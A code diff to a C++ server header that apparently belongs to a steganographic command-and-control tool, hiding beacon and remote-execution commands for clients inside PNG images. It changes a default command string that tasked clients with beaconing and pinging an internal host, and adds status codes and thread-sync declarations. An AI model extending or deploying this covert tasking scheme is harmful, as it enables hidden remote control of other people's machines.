@@ -19,18 +19,28 @@
 #include <fcntl.h>
 #include <vector>
 #include <map>
+#include "stegImage.h"
 #include <sstream>
+#include <mutex>
+#include <condition_variable>
+
 
 #define DEFAULT_PATH "images/default.png" //Default image client will read from
 #define DEFAULT_RPATH "images/defaultR.png"   //Default image server will use to encode image from
-#define DEFAULT_COMMAND "<COM:ALL:1-beacon-5000:4-ping -n 10 10.0.0.35:1-path-/images/tree.png>"   //Default Command to execute (Initialization Sequence)
+#define DEFAULT_COMMAND "<COM:ALL:1-beacon-5000:5-0:1-path-/images/tree.png>"   //Default Command to execute (Initialization Sequence)
 #define BUFFER 4096   
 
 struct statusResponse{
         std::string Status_400 = "400 Bad Request";
         std::string Status_404 = "404 Not Found";
         std::string Status_200 = "200 OK";
+        std::string Status_201 = "201 Created";
 };
+extern std::map<std::string,int> fileMap; 
+//Mutex for files
+extern std::mutex mapMutex;
+//Condition variable
+extern std::condition_variable fileCond;
 
 class Server{
 private:
